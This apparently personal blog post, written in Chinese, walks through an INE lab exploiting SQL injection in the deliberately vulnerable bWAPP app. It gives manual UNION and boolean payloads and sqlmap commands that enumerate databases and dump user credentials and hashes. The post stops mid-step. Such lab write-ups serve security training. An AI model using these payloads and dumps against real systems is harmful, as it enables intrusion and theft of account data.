---
layout: post
title: "SQL Injection Lab"
date: "2022-07-05"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Web Attacks
---

# SQL Injection Lab
## 概述
在本实验中，您将学习使用 SQLMap 工具发现 SQLi 漏洞并利用它。
## 任务
### 实验室环境
在这个实验室环境中，用户将获得对 Kali GUI 实例的访问权限。bWAPP Web 应用程序可以使用安装在 Kali 上的工具访问 http://demo.ine.local

目标：使用 SQLMap 对 Web 应用程序执行 SQL 注入攻击！

![demoinelocal.png](/img/in-post/ine/demoinelocal.png)

bWAPP登录信息：
用户名：
`bee`
密码：
`bug`

### 工具
该实验室的最佳工具是：

* SQLMap
* 网络浏览器
* Burp Suite

## 我自己的解决思路
```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.140.217.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.140.217.3): icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from demo.ine.local (192.140.217.3): icmp_seq=2 ttl=64 time=0.058 ms
64 bytes from demo.ine.local (192.140.217.3): icmp_seq=3 ttl=64 time=0.055 ms
64 bytes from demo.ine.local (192.140.217.3): icmp_seq=4 ttl=64 time=0.058 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3060ms
rtt min/avg/max/mdev = 0.048/0.054/0.058/0.004 ms

root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.22  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:16  txqueuelen 0  (Ethernet)
        RX packets 2892  bytes 253156 (247.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2345  bytes 2328317 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.140.217.2  netmask 255.255.255.0  broadcast 192.140.217.255
        ether 02:42:c0:8c:d9:02  txqueuelen 0  (Ethernet)
        RX packets 29  bytes 2510 (2.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 1064 (1.0 KiB)                                                                                                                                                 
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                                                          
                                                                                                                                                                                            
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                                                                                                                
        inet 127.0.0.1  netmask 255.0.0.0                                                                                                                                                   
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10174  bytes 30885572 (29.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10174  bytes 30885572 (29.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 15:01 IST
Nmap scan report for demo.ine.local (192.140.217.3)
Host is up (0.0000090s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:C0:8C:D9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

```
http://demo.ine.local/sqli_1.php?title=bee&action=search
```

```
bee'
http://demo.ine.local/sqli_1.php?title=bee%27&action=search

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

```
bee' or 1=1; -- -
http://demo.ine.local/sqli_1.php?title=bee%27+or+1%3D1%3B+--+-&action=search

Title 	Release 	Character 	Genre 	IMDb
G.I. Joe: Retaliation 	2013 	Cobra Commander 	action 	Link
Iron Man 	2008 	Tony Stark 	action 	Link
Man of Steel 	2013 	Clark Kent 	action 	Link
Terminator Salvation 	2009 	John Connor 	sci-fi 	Link
The Amazing Spider-Man 	2012 	Peter Parker 	action 	Link
The Cabin in the Woods 	2011 	Some zombies 	horror 	Link
The Dark Knight Rises 	2012 	Bruce Wayne 	action 	Link
The Fast and the Furious 	2001 	Brian O'Connor 	action 	Link
The Incredible Hulk 	2008 	Bruce Banner 	action 	Link
World War Z 	2013 	Gerry Lane 	horror 	Link
```

```
bee' or 1=2; -- -
http://demo.ine.local/sqli_1.php?title=bee%27+or+1%3D2%3B+--+-&action=search

No movies were found!
```

GET参数title存在布尔注入，而action不存在。

尝试联合注入
```
noexist' UNION SELECT 'els1'; -- -
noexist' UNION SELECT 'els1','els2'; -- -
noexist' UNION SELECT 'els1','els2','els3'; -- -
noexist' UNION SELECT 'els1','els2','els3','els4'; -- -
noexist' UNION SELECT 'els1','els2','els3','els4','els5'; -- -
noexist' UNION SELECT 'els1','els2','els3','els4','els5','els6'; -- -

Error: The used SELECT statements have a different number of columns
```

title支持联合注入，且els2，els3，els5，els4会输出到页面中。
```
noexist' UNION SELECT 'els1','els2','els3','els4','els5','els6','els7'; -- -

Title 	Release 	Character 	Genre 	IMDb
els2 	els3 	els5 	els4 	Link
```

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U
```
需要带上cookie，否则会被302重定向到/login.php。使用Burp拦截，获取到cookie值。

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0'
```

```
sqlmap identified the following injection point(s) with a total of 19 HTTP(s) requests:
---
Parameter: title (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: title=bee' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170787a71,0x4d79484e49516d4355564e4a556b4e6c466347734e78446a6f7656714d5561687979455a444f6942,0x716b6b7671),NULL,NULL-- -&action=search
---
[15:40:47] [INFO] testing MySQL
[15:40:47] [INFO] confirming MySQL
[15:40:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[15:40:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'
```

`--banner`：获取后端数据库的banner。

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' --banner

banner: '5.5.47-0ubuntu0.14.04.1'
```

`-v3`：显示使用了哪些payloads。`--fresh-queries`：删除缓存。

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' --banner -v3 --fresh-queries

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: title=bee' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170787a71,0x4d79484e49516d4355564e4a556b4e6c466347734e78446a6f7656714d5561687979455a444f6942,0x716b6b7671),NULL,NULL-- -&action=search
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL-- -
---
[15:48:36] [INFO] the back-end DBMS is MySQL
[15:48:36] [INFO] fetching banner
[15:48:36] [PAYLOAD] bee' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170787a71,IFNULL(CAST(VERSION() AS NCHAR),0x20),0x716b6b7671),NULL,NULL-- -
[15:48:37] [DEBUG] performed 1 query in 0.11 seconds
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5
banner: '5.5.47-0ubuntu0.14.04.1'
[15:48:37] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'
```

手动测试payload：`bee' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170787a71,IFNULL(CAST(VERSION() AS NCHAR),0x20),0x716b6b7671),NULL,NULL-- -`

```
Title 	Release 	Character 	Genre 	IMDb
		qpxzq5.5.47-0ubuntu0.14.04.1qkkvq 		Link
```

`--users`：枚举Web应用程序包含的数据库用户。

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' --users

database management system users [6]:
[*] 'admin'@'%'
[*] 'pentester'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'ba1e50a08de7'
[*] 'root'@'localhost'
```

`--dbs`：检查连接到应用程序的数据库。

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' --dbs

available databases [4]:
[*] bWAPP
[*] information_schema
[*] mysql
[*] performance_schema
```

枚举bWAPP数据库中的表：

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' -D bWAPP --tables

Database: bWAPP
[5 tables]
+----------+
| blog     |
| heroes   |
| movies   |
| users    |
| visitors |
+----------+
```

列出users表中的列：

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' -D bWAPP -T users --columns

Database: bWAPP
Table: users
[9 columns]
+-----------------+--------------+
| Column          | Type         |
+-----------------+--------------+
| activated       | tinyint(1)   |
| activation_code | varchar(100) |
| admin           | tinyint(1)   |
| email           | varchar(100) |
| id              | int(10)      |
| login           | varchar(100) |
| password        | varchar(100) |
| reset_code      | varchar(100) |
| secret          | varchar(100) |
+-----------------+--------------+
```

获取列中的数据，使用基于字典的攻击：

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' -D bWAPP -T users -C activated,activation_code,admin,email,id,login,password,reset_code,secret --dump

Database: bWAPP                                                                                                                                                                            
Table: users
[2 entries]
+-----------+-----------------+-------+--------------------------+----+--------+------------------------------------------------+------------+-------------------------------------+
| activated | activation_code | admin | email                    | id | login  | password                                       | reset_code | secret                              |
+-----------+-----------------+-------+--------------------------+----+--------+------------------------------------------------+------------+-------------------------------------+
| 1         | NULL            | 1     | bwapp-aim@mailinator.com | 1  | A.I.M. | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | A.I.M. or Authentication Is Missing |
| 1         | NULL            | 1     | bwapp-bee@mailinator.com | 2  | bee    | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | Any bugs?                           |
+-----------+-----------------+-------+--------------------------+----+--------+------------------------------------------------+------------+-------------------------------------+

[16:18:49] [INFO] table 'bWAPP.users' dumped to CSV file '/root/.local/share/sqlmap/output/demo.ine.local/dump/bWAPP/users.csv'
[16:18:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'

```

不使用基于字典的攻击，password的hash值并没有被破解。`--flush-session`：需要重新选择所有的配置。而`--fresh-queries`仅删除缓存。

```
sqlmap -u 'http://demo.ine.local/sqli_1.php?title=bee&action=search' -p title --technique=U --cookie='PHPSESSID=lp7os0i8hodgtqgvrijreng7e3; security_level=0' -D bWAPP -T users -C activated,activation_code,admin,email,id,login,password,reset_code,secret --dump --flush-session

Database: bWAPP
Table: users
[2 entries]
+-----------+-----------------+-------+--------------------------+----+--------+------------------------------------------+------------+-------------------------------------+
| activated | activation_code | admin | email                    | id | login  | password                                 | reset_code | secret                              |
+-----------+-----------------+-------+--------------------------+----+--------+------------------------------------------+------------+-------------------------------------+
| 1         | NULL            | 1     | bwapp-aim@mailinator.com | 1  | A.I.M. | 6885858486f31043e5839c735d99457f045affd0 | NULL       | A.I.M. or Authentication Is Missing |
| 1         | NULL            | 1     | bwapp-bee@mailinator.com | 2  | bee    | 6885858486f31043e5839c735d99457f045affd0 | NULL       | Any bugs?                           |
+-----------+-----------------+-------+--------------------------+----+--------+------------------------------------------+------------+-------------------------------------+

[16:23:06] [INFO] table 'bWAPP.users' dumped to CSV file '/root/.local/share/sqlmap/output/demo.ine.local/dump/bWAPP/users.csv'
[16:23:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'
```

经验证：用户名`A.I.M.`，密码`bug`有效。

```
http://demo.ine.local/sqli_6.php
```

请求：
```
POST /sqli_6.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://demo.ine.local
Connection: close
Referer: http://demo.ine.local/sqli_6.php
Cookie: PHPSESSID=8me5telegjbtubvtbjanbabib0; security_level=0
Upgrade-Insecure-Requests: 1

title=bee&action=search
```

响应：
```
HTTP/1.1 200 OK
Date: Tue, 05 Jul 2022 11:09:20 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 13485
Connection: close
Content-Type: text/html

No movies were found!
```

对POST参数进行测试：title存在SQL注入，而action不存在。
```
title=bee'&action=search

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

```
title=bee&action=search'

No movies were found!
```

查询出了所有的电影：

```
title=bee' or 1=1; -- -&action=search
```

```
title=bee' or 1=2; -- -&action=search

No movies were found!
```

尝试其他的永真条件，查询出所有电影。

```
title=bee' or 'elsrocks'='elsrocks'; -- -&action=search
```

和永假条件，
```
title=bee' or 'elsrocks'='no'; -- -&action=search

No movies were found!
```

title是一个有效注入点。
```
sqlmap -u http://demo.ine.local/sqli_6.php --data='title=bee&action=search' -p title --technique=B --cookie='PHPSESSID=8me5telegjbtubvtbjanbabib0; security_level=0' --banner
```

```
sqlmap identified the following injection point(s) with a total of 111 HTTP(s) requests:
---
Parameter: title (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=bee' OR NOT 1856=1856#&action=search
---
[17:08:16] [INFO] the back-end DBMS is MySQL
[17:08:16] [INFO] fetching banner
[17:08:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[17:08:16] [INFO] retrieved: 5.5.47-0ubuntu0.14.04.1
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL Unknown
banner: '5.5.47-0ubuntu0.14.04.1'
[17:08:17] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'

```

`--dbs`：枚举数据库。

```
sqlmap -u http://demo.ine.local/sqli_6.php --data='title=bee&action=search' -p title --technique=B --cookie='PHPSESSID=8me5telegjbtubvtbjanbabib0; security_level=0' --dbs

available databases [4]:
[*] bWAPP
[*] information_schema
[*] mysql
[*] performance_schema
```

```
sqlmap -u http://demo.ine.local/sqli_6.php --data='title=bee&action=search' -p title --technique=B --cookie='PHPSESSID=8me5telegjbtubvtbjanbabib0; security_level=0' -D bWAPP --tables

Database: bWAPP
[5 tables]
+----------+
| blog     |
| heroes   |
| movies   |
| users    |
| visitors |
+----------+
```

导出Burp Proxy拦截的请求，`右键->Copy to file`。

```
sqlmap -r bloglogin.req -p title --technique=B --banner

web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL unknown
banner: '5.5.47-0ubuntu0.14.04.1'
```

```
sqlmap -r bloglogin.req -p title --technique=B --banner -v3

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=bee' OR NOT 1856=1856#&action=search
    Vector: OR NOT [INFERENCE]#
---
[17:25:01] [DEBUG] performed 0 queries in 0.00 seconds
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL unknown
banner: '5.5.47-0ubuntu0.14.04.1'

```

在DEBUG中，执行了0个查询，因为我们已经有了banner信息。

```
[17:25:01] [DEBUG] performed 0 queries in 0.00 seconds
```

```
ls /root/.local/share/sqlmap/output/demo.ine.local
dump  log  session.sqlite  target.txt
```

重新运行测试：`--flush-session`。

```
sqlmap -r bloglogin.req -p title --technique=B -D bWAPP -T heroes --columns --flush-session

Database: bWAPP
Table: heroes
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(10)      |
| login    | varchar(100) |
| password | varchar(100) |
| secret   | varchar(100) |
+----------+--------------+

[17:38:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'
```

```
sqlmap -r bloglogin.req -p title --technique=B -D bWAPP -T heroes -C id,login,password,secret --dump --flush-session

Database: bWAPP
Table: heroes
[6 entries]
+----+-----------+----------------+---------------------------------------+
| id | login     | password       | secret                                |
+----+-----------+----------------+---------------------------------------+
| 1  | neo       | trinity        | Oh why didn't I took that BLACK pill? |
| 2  | alice     | loveZombies    | There's a cure!                       |
| 3  | thor      | Asgard         | Oh, no... this is Earth... isn't it?  |
| 4  | wolverine | Log@N          | What's a Magneto?                     |
| 5  | johnny    | m3ph1st0ph3l3s | I'm the Ghost Rider!                  |
| 6  | seline    | m00n           | It wasn't the Lycans. It was you.     |
+----+-----------+----------------+---------------------------------------+

[17:41:46] [INFO] table 'bWAPP.heroes' dumped to CSV file '/root/.local/share/sqlmap/output/demo.ine.local/dump/bWAPP/heroes.csv'
[17:41:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'

```

```
sqlmap -r bloglogin.req -p title --technique=B --banner -v3 --flush-session

[DEBUG] performed 168 queries in 1.04 seconds
```

## 解决方案
第 1 步：打开实验室链接以访问 Kali GUI 实例。

第 2 步：检查提供的机器/域是否可访问。

命令
```
ping demo.ine.local
```

```
root@INE:~# ping demo.ine.local
PING demo.ine.local (192.248.202.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.248.202.3): icmp_seq=1 ttl=64 time=0.089 ms
64 bytes from demo.ine.local (192.248.202.3): icmp_seq=2 ttl=64 time=0.071 ms
64 bytes from demo.ine.local (192.248.202.3): icmp_seq=3 ttl=64 time=0.075 ms
64 bytes from demo.ine.local (192.248.202.3): icmp_seq=4 ttl=64 time=0.061 ms
^C
--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3052ms
rtt min/avg/max/mdev = 0.061/0.074/0.089/0.010 ms
```

提供的机器是可访问的。

第 3 步：检查提供的机器上的开放端口。

命令

```
nmap demo.ine.local
```

```
root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 20:53 IST
Nmap scan report for demo.ine.local (192.248.202.3)
Host is up (0.0000080s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:C0:F8:CA:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```
在提供的机器上，端口 80 (HTTP) 和 3306 (MySQL) 是开放的。

第 4 步：检查 Kali 机器上存在的接口。

命令

```
ifconfig
```

```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.18  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:12  txqueuelen 0  (Ethernet)
        RX packets 7614  bytes 619496 (604.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6050  bytes 2543817 (2.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.248.202.2  netmask 255.255.255.0  broadcast 192.248.202.255
        ether 02:42:c0:f8:ca:02  txqueuelen 0  (Ethernet)
        RX packets 1026  bytes 56084 (54.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1010  bytes 58668 (57.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                                                          
                                                                                                                                                                                            
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                                                                                                                
        inet 127.0.0.1  netmask 255.0.0.0                                                                                                                                                   
        loop  txqueuelen 1000  (Local Loopback)                                                                                                                                             
        RX packets 26296  bytes 36809889 (35.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26296  bytes 36809889 (35.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

机器上有两个接口（不包括环回接口），即 eth0 和 eth1。

第 5 步：打开网络浏览器并浏览到demo.ine.local。

第 6 步：使用给定的凭据用户名bee和密码bug登录 bWAPP 。

第 7 步：从列表中选择SQL Injection (GET/Search)并按下Hack按钮

第 8 步：在SQL Injection (GET/Search)页面上，在搜索栏中键入“hello”，然后按Search按钮。

```
No movies were found!
```

注意 URL，“hello”字符串作为 URL 参数传递。

```
http://demo.ine.local/sqli_1.php?title=hello&action=search
```

第 9 步：配置 Firefox 以使用 burp 代理。

第 10 步：启动 Burp Suite！

在警告对话框中按确定按钮。

创建一个临时项目。

对于本实验，我们可以使用 Burp 的默认配置

注意：如果您收到“Burp Suite 已过期”消息。单击确定忽略它并继续。

第 11 步：刷新页面（或再次搜索“hello”）。在 burp 代理中拦截请求并复制 cookie。SQLMap 需要此 cookie 才能工作。

```
Cookie: PHPSESSID=hjdsm2548593prtqagvbvl2ov4; security_level=0
```

第 12 步：在目标 Web 应用程序上运行 SQLMap。将“title”定义为测试参数（输入字符串作为 title 的值传递）。

命令
```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title
```

```
Do you want to skip test payloads specific to other DBMSes? y
Do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
Do you want to keep testing the others (if any)? [y/N] y
```

SQLMap 发现了 title 参数的问题，并且还建议了三个有效负载（SQL 查询）。

```
sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
---
Parameter: title (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: title=hello' AND EXTRACTVALUE(6810,CONCAT(0x5c,0x716a6b6271,(SELECT (ELT(6810=6810,1))),0x7162766b71)) AND 'xkCg'='xkCg&action=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=hello' AND (SELECT 5398 FROM (SELECT(SLEEP(5)))Gvcu) AND 'CpTo'='CpTo&action=search

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: title=hello' UNION ALL SELECT NULL,CONCAT(0x716a6b6271,0x4a455269417069454f48766941494c6c676a77716d49744d756c53566e7773504e49656d69444a41,0x7162766b71),NULL,NULL,NULL,NULL,NULL-- -&action=search
---
[21:06:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.1
[21:06:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'
```

第 13 步：将捕获的请求发送到Repeater。

`右键->Send to Repeater`

我们将使用 SQLMap 测试我们收到的有效载荷

第 14 步：复制第一个有效负载并将其粘贴为标题参数的一部分。然后将请求发送到服务器。

```
GET /sqli_1.php?title=hello' AND EXTRACTVALUE(6810,CONCAT(0x5c,0x716a6b6271,(SELECT (ELT(6810=6810,1))),0x7162766b71)) AND 'xkCg'='xkCg&action=search HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://demo.ine.local/sqli_1.php?title=hello&action=search
Cookie: PHPSESSID=hjdsm2548593prtqagvbvl2ov4; security_level=0
Upgrade-Insecure-Requests: 1
```

检查响应。它引发 SQL 语法错误。

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

第 15 步：使用 SQLMapto 获取数据库服务器上存在的数据库列表。

命令

```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs
```

```
[21:22:45] [INFO] fetching database names
available databases [4]:
[*] bWAPP
[*] information_schema
[*] mysql
[*] performance_schema

```

我们发现了四个使用 SQLMap 的数据库

第 16 步：使用 SQLMap 获取数据库 bWAPP 的表列表。

命令

```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables
```

```
[21:22:45] [INFO] fetching tables for database: 'bWAPP'
Database: bWAPP
[5 tables]
+----------+
| blog     |
| heroes   |
| movies   |
| users    |
| visitors |
+----------+

```

目前有5张表。

第 17 步：使用 SQLMap 获取bWAPP 数据库的users表中的列列表

命令

```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users --columns
```

```
[21:30:15] [INFO] fetching columns for table 'users' in database 'bWAPP'
Database: bWAPP
Table: users
[9 columns]
+-----------------+--------------+
| Column          | Type         |
+-----------------+--------------+
| activated       | tinyint(1)   |
| activation_code | varchar(100) |
| admin           | tinyint(1)   |
| email           | varchar(100) |
| id              | int(10)      |
| login           | varchar(100) |
| password        | varchar(100) |
| reset_code      | varchar(100) |
| secret          | varchar(100) |
+-----------------+--------------+

[21:30:15] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'
```

第 18 步：使用 SQLMap 从users表中转储 admin 的密码和电子邮件。出现提示时按两次“n”。

命令

```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
```

```
Do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
Do you want to crack them via a dictionary-based attack? [Y/n/q] n
```

```
Database: bWAPP
Table: users
[2 entries]
+-------+------------------------------------------+--------------------------+
| admin | password                                 | email                    |
+-------+------------------------------------------+--------------------------+
| 1     | 6885858486f31043e5839c735d99457f045affd0 | bwapp-aim@mailinator.com |
| 1     | 6885858486f31043e5839c735d99457f045affd0 | bwapp-bee@mailinator.com |
+-------+------------------------------------------+--------------------------+

```

提取的管理员用户密码哈希和电子邮件 ID。

第 19 步：关闭 Burp Suite 的拦截模式。

第 20 步：从列表中选择“SQL Injection (POST/Search)”，然后按“Hack”按钮。

点击“Bugs”

选择“SQL 注入（POST/搜索）”

第 21 步：再次开启 Burp 的拦截模式。

第 22 步：从此搜索页面中搜索“Hello”。

第 23 步：右键单击并将截获的请求复制到文件中。

将文件另存为“request”。

检查请求文件的内容。

```
cat request
```

第 24 步：使用此保存的文件运行 SQLMap。再次将“title”作为测试参数

命令

```
sqlmap -r request -p title
```

```
Do you want to skip test payloads specific for other DBMSes? [Y/n] y
Do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
```

```
Do you want to keep testing the others (if any)? [y/N] n
```

```
sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
---
Parameter: title (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: title=hello' AND EXTRACTVALUE(2131,CONCAT(0x5c,0x71626b7071,(SELECT (ELT(2131=2131,1))),0x7178767a71)) AND 'Sxxe'='Sxxe&action=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=hello' AND (SELECT 4377 FROM (SELECT(SLEEP(5)))zbua) AND 'RuvB'='RuvB&action=search

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: title=hello' UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x695962724b6764634e41676b55434d524e676b5a4e6f5578696a6b664e5377596270537847497153,0x7178767a71),NULL,NULL,NULL,NULL-- -&action=search
---
[21:44:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.1
[21:44:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/demo.ine.local'
```

步骤 25：将捕获的请求发送到Repeater。

`右键->Send to Repeater`

第 26 步：从 SQLMap 输出复制有效负载并将其添加到 POST 数据（作为 title 参数值的一部分）。

有效载荷

```
